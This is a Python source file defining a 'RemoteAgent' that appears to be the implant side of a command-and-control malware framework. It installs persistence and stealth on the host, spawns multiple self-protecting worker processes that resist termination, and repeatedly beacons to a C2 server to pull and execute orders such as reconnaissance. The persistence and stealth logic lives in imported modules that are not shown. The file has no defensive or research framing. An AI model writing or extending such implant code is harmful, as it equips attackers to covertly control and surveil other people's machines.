import time
import requests
import json
import random
import signal
import sys
from apex_framework.core.hal import PlatformHAL
from apex_framework.ops.resilience import ResilienceManager
from apex_framework.ops.stealth_ops import StealthOperations
from rich.console import Console

console = Console()

class RemoteAgent:
    """
    Remote Agent.
    Connects to Central Controller and executes orders.
    INTEGRATED: Universal OS Support via HAL.
    """
    def __init__(self, c2_url="http://localhost:8080"):
        self.id = f"AGENT_{random.randint(1000,9999)}"
        self.c2_url = c2_url
        self.active = True
        self.os_strategy = PlatformHAL.detect() # Dynamic OS Loading
        self.whisper = StealthOperations()

    def deploy(self):
        # 1. OS-Specific Persistence & Stealth
        self.os_strategy.install_persistence()
        self.os_strategy.engage_stealth()

        # 2. Universal Resilience
        ResilienceManager.plant_seed()

        # 3. Spawn Brood
        # Note: multiprocessing fork might behave differently on Win/Android
        # We wrap in try/except for compatibility
        try:
            # On Linux only for now for signals
            if sys.platform != "win32":
                signal.signal(signal.SIGTERM, ResilienceManager.handle_termination)

            larvae = ResilienceManager.spawn_brood(count=3, target_func=self._larva_lifecycle)
            console.print(f"[{self.id}] 👑 Overseer Active. Monitoring {len(larvae)} Larvae.")
            for l in larvae: l.join()
        except Exception as e:
            console.print(f"[AGENT] ⚠️ Brood Spawn failed (OS Limit?): {e}. Running Solo.")
            self._larva_lifecycle("SOLO")

    def _larva_lifecycle(self, identity):
        console.print(f"[{identity}] 🚀 Active. Connecting to {self.c2_url}")
        while self.active:
            try:
                requests.post(f"{self.c2_url}/beacon", json={"id": f"{self.id}_{identity}", "status": "ALIVE"})
                resp = requests.get(f"{self.c2_url}/orders")
                if resp.status_code == 200:
                    orders = resp.json()
                    if orders.get('type') == "RECON_2026":
                        # Delegate Recon to OS Strategy
                        self.os_strategy.perform_recon()
                time.sleep(2)
            except Exception as e:
                time.sleep(2)
